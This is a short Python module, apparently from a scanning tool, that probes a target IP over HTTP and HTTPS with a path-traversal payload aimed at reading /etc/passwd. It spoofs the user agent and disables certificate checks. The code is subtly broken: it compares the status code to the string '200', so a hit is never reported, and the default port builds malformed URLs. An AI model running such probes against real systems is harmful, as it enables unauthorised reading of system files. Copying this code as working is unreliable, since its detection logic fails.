import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def traversal(ip, ports=None, timeout=10):
    path = "/../../../../../../../../../../../../../etc/passwd"
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for protocol in protocols:
        for port in ports:
            url = f"{protocol}://{ip}{port}{path}"
            headers = {
                'User-Agent': user_agents()
            }
            try:
                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
                if "root:" in response.text and response.status_code == "200":
                    print_green(f"Directory traversal vulnerability found at: {url}")
                    return True
            except requests.RequestException:
               continue
    return False